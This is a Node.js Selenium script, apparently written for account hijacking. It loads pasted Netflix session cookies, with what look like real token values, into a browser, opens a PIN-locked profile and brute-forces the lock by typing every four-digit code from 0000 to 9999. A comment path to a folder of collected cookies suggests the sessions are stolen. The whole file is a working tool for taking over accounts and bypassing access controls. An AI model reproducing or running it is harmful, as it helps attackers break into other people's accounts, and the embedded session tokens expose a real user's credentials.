const { Builder, By, Key, until } = require('selenium-webdriver');
const fsPromises = require('fs').promises;
const { promisify } = require('util');
const sleep = promisify(setTimeout);
const path = require('path');
const fs = require('fs');

// const filePath = "C:\\Users\\thain\\Desktop\\All-Cookies-Yam\\Cookies-Level-BONUS\\test.txt";

async function crackPIN() {
    // Copy cookies json and paste here;
    const cookieString = `[{"name":"NetflixId","value":"v%3D2%26ct%3DBQAOAAEBEBMTpYXsX6h-ASXodw5WQBKBwOUsowE0tUrLcaI7BmDd6X9U8f5Nzs28JDnpkSN03gwSHfKdi9rPe1Ro33DkxqA2r8rMP5KRwprFlACyc-MWc_LYuSxrUadE3zqvTBMFIcSH44csRpZJbEaeNtMD7Ibt8WU7gbSTjfOcmuOsLIIQEv64kygEgId1AIgkjMgCRZmf6TXQyswo4P7hzLEC4ejv6lRiQ6zndUNwQ8qF8FEdJEC7X1kUP7r-Fq4K4tc7KnDia10KP8oOVCFxS6euPqJpuzH0VrRd0eHuHxSIPLV7N6V2Esh2iNxJsFDpzrH4F7xxRZSz08T39b6tiC4FDY7g-0HP8jhWMHBzAcxM3ymo7r2fJDsEfKyKt3cBgvKcb2RBKog_9yXMU1D9myWsNXrqTiCdjJaNuuykHCU2VAXHpOuQZuTfmzGZvqTRTuUeU958RnAwuHfGm7oXhSFJYvfg2cUCBNzzWT39Lc9SfrmC0gVjxu6yTJkRojtgULw6iIDVHDDg2fX8qtV7jLm4OZxOlXx0xipLKziERcwqMHz1g0jOoYDC5oGog86DwWsAXzXobqUtaJThd88SoIlMHQE2F3mceuIlE4R973GDK9aQvZg.%26bt%3Ddbl%26ch%3DAQEAEAABABSueqYcoiEbZ6JLyeW0YZK8oHC1ZUdpWpQ.%26mac%3DAQEAEAABABR7JVdsEDdXxmDdXH4aNpjLj5rf9N-SiFg."},{"name":"SecureNetflixId","value":"v%3D2%26mac%3DAQEAEQABABS2srEr5gb649z_mtvblECVODYCVRMQsZ4.%26dt%3D1645427569691"}]`;
    const cookieData = JSON.parse(cookieString);

    const driver = await new Builder().forBrowser('chrome').build();

    try {
        await driver.get('https://www.netflix.com/');
        await driver.manage().deleteAllCookies();
        for (const cookie of cookieData) {
            await driver.manage().addCookie(cookie);
        }
        driver.navigate().refresh();

        // Copy full XPath of User Locked;
        const clickUserLock = await driver.findElement(By.xpath('/html/body/div[1]/div/div/div[1]/div[1]/div[2]/div/div/ul/li[4]/div/a/div/div'))
        await clickUserLock.click();

        const inputFields = [];
        for (let i = 1; i <= 4; i++) {
            // Change XPath of Pin if it change in the future;
            const xpath = `/html/body/div[1]/div/div/div[1]/div[1]/div[2]/div/div[3]/div/input[${i}]`;
            const inputField = await driver.findElement(By.xpath(xpath));
            inputFields.push(inputField);
        }

        for (let number = 0; number <= 9999; number++) {
            const formattedNumber = String(number).padStart(4, '0');

            // Log the current number
            console.log(formattedNumber);

            // Enter each digit into the corresponding input field
            for (let i = 0; i < 4; i++) {
                await inputFields[i].sendKeys(formattedNumber[i]);
            }

            // Add a brief pause (adjust as needed)
            await driver.sleep(500);
        }

        await sleep(5000);
    } finally {
        await driver.quit();
    }
}
crackPIN();